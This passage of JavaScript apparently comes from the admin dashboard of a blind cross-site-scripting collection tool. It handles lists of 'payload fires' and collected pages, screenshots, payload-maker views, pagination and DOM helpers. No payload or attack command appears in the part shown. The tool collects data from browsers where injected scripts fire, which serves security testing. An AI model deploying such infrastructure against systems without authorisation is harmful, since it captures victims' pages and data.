                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                const table = document.getElementById('pagesTable');
                data.forEach(item => {
                    const row = table.insertRow();
                    const idCell = row.insertCell();
                    const uriCell = row.insertCell();
                    const actionCell = row.insertCell();

                    idCell.textContent = item.id;
                    uriCell.textContent = item.uri;

                    const deleteButton = document.createElement('button');
                    deleteButton.textContent = 'Delete';
                    deleteButton.className = 'action_button';
                    deleteButton.onclick = function() {
                        deleteCollectedPage(item.id);
                    };
                    actionCell.appendChild(deleteButton);
                });
            });
        }

        function refreshCollectedPages() {
            const table = document.getElementById('pagesTable');
            while (table.rows.length > 1) {
                table.deleteRow(1);
            }
            state.collected_pages = 0;
            loadCollectedPages();
        }

        function changePageCollectedPages(pageIncrement) {
            state.collected_pages += pageIncrement;
            if (state.collected_pages == 1) {
                state.collected_pages = 1;
                const previousButton = document.getElementById('collected_pages_previous_button');
                if (previousButton) {
                    previousButton.remove();
                }
            } else {
                const previousButtonOrigin = document.getElementById('collected_pages_previous_button');
                if (!previousButtonOrigin) {
                    const nextButton = document.getElementById('collected_pages_next_button');
                    const previousButton = make_element('button', 'Previous Page', null, 'action_button', function() {
                        changePageCollectedPages(-1);
                    });
                    previousButton.id = 'collected_pages_previous_button';

                    nextButton.parentNode.insertBefore(previousButton, nextButton);
                }
            }
            refreshCollectedPages();
        }

        function deleteCollectedPage(id) {
            var form_data = new FormData();
            form_data.append("ids", id);

            fetch('/api/v1/collected_pages', {
                method: 'DELETE',
                body: form_data
            })
            .then(() => {
                // Reload the page to get the updated list
                location.reload();
            });
        }

        // Load the collected pages when the page loads
        window.onload = start;
        function start() {
            loadVersion(true);
            loadPayloadFires();
        }
    </script>

    <script>
        var state = {
            payload_fires: 1,
            collected_pages: 0,
            settings: 0,
            payloads: 0,
            payload_maker: 0,
            payload_import_export: 0,
            settings_form: {},
            payload_fires_page: 1,
            collected_pages_page: 1
        };



        function navbar(page) {
            document.getElementById('payload_fires').style.display = 'none';
            document.getElementById('collected_pages').style.display = 'none';
            document.getElementById('settings').style.display = 'none';
            document.getElementById('payloads').style.display = 'none';
            document.getElementById('payload_maker').style.display = 'none';
            document.getElementById('payload_import_export').style.display = 'none';

            switch (page) {
                case 'payload_fires':
                    document.getElementById('payload_fires').style.display = 'flex';
                    break;
                case 'collected_pages':
                    loadCollectedPages();
                    document.getElementById('collected_pages').style.display = 'flex';
                    break;
                case 'settings':
                    loadSettings();
                    document.getElementById('settings').style.display = 'flex';
                    break;
                case 'payloads':
                    makePayloadsTable();
                    document.getElementById('payloads').style.display = 'flex';
                    break;
                case 'payload_maker':
                    makePayloadMaker();
                    document.getElementById('payload_maker').style.display = 'flex';
                    break;
                case 'payload_import_export':
                    makePayloadImporterExporter();
                    document.getElementById('payload_import_export').style.display = 'flex';
                    break;
                default:
                    break;
            }
        }

        function make_element(tag, text = null, parent = null, style_class = null, onclick_function = null) {
            var element = document.createElement(tag);
            element.textContent = text;
            if (style_class) {
                element.className = style_class;
            }
            if (onclick_function) {
                element.onclick = onclick_function;
            }
            if (parent) {
                parent.appendChild(element);
            }
            return element;
        }

        function make_image(src, alt, parent = null, style_class = null) {
            var image = document.createElement('img');
            image.src = `/screenshots/${src}.png`;
            image.alt = alt;
            if (style_class) {
                image.className = style_class;
            }
            if (parent) {
                parent.appendChild(image);
            }
            return image;
        }

        function make_modal(style_class) {
            var modal = make_element('div', null, null, style_class);
            
            // Add event listener to close modal when clicking outside
            modal.addEventListener('click', function(event) {
                // Check if the click was directly on the modal backdrop
                // (not on any of its children)
                if (event.target === modal) {
                    modal.remove();
                }
            });
            
            // Add event listener for Escape key to close modal
            function escapeKeyHandler(event) {
                if (event.key === 'Escape' || event.keyCode === 27) {
                    modal.remove();
                    document.removeEventListener('keydown', escapeKeyHandler);
                }
            }
            
            document.addEventListener('keydown', escapeKeyHandler);
            
            // Clean up event listener when modal is removed
            modal.addEventListener('remove', function() {
                document.removeEventListener('keydown', escapeKeyHandler);
            });
            
            // Override remove method to ensure event cleanup
            const originalRemove = modal.remove;
            modal.remove = function() {
                document.removeEventListener('keydown', escapeKeyHandler);
                originalRemove.call(modal);
            };
            
            return modal;
        }

        function make_modal_element(label_tag, item_tag, label, text = null, parent = null, div_style_class = 'modal_element_div', label_style_class = 'modal_element_label', item_style_class = 'modal_element_item', onclick_function = null) {
            var parent_div = make_div(div_style_class, parent);
            var div = make_element(label_tag, label, parent_div, label_style_class, onclick_function)
            var element = make_element(item_tag, text, parent_div, item_style_class, onclick_function);
            return element;
        }

        function make_div(style_class, parent = null) {
            var div = make_element('div', null, parent, style_class);
            return div;
        }

        function make_table(style_class, parent = null) {
            var table = make_element('table', null, parent);
            return table;
        }

        function make_table_row(table, style_class = null) {
            var row = table.insertRow();
            if (style_class) {
                row.className = style_class;
            }
            return row;
        }

        function make_editable_table_cell(value, key, row, is_bool, style_class = null) {
            var cell = row.insertCell();
            var input = document.createElement('input');
        
            input.type = is_bool ? 'checkbox' : 'text';
            if (is_bool) {
                input.checked = value === 'true';
            } else {
                input.value = value;
            }
            input.id = key;
            cell.appendChild(input);
            if (style_class) {
                cell.className = style_class;
            }
            return cell;
        }

        function make_settings_table_cell(row, key, value, style_class = null) {
            var key_cell = make_table_cell(key, row, `${style_class} key_cell`);
            var is_bool = key === 'SEND_ALERTS';
            var value_cell = make_editable_table_cell(value, key, row, is_bool, `${style_class} value_cell`);
        }

        function make_table_cell(text, row, style_class = null) {
            var cell = row.insertCell();
            cell.textContent = text;
            if (style_class) {
                cell.className = style_class;
            }
            return cell;
        }

        function html_encode(value){
            return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace( /=/g, '&#61;' ).replace( / /g, '&#32;' );
        }
    </script>
</body>
</html>